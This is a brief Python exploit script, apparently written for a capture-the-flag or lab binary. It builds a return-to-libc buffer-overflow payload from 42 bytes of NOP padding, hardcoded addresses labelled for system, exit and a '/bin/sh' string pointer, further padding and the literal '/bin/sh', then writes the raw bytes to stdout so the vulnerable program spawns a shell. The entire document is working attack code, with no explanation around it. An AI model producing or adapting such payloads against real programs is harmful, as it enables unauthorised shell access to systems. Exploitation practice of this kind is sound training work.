import sys

system_add = b"\x20\x26\x05\x08"

exit_add = b"\x70\x0e\x05\x08"
binsh_add = b"\x08\x8a\xf6\xff"





payload = b"\x90"*42
payload += system_add
payload += exit_add
payload += binsh_add
payload += b"\x90"*32
payload += b"/bin/sh"










sys.stdout.buffer.write(payload)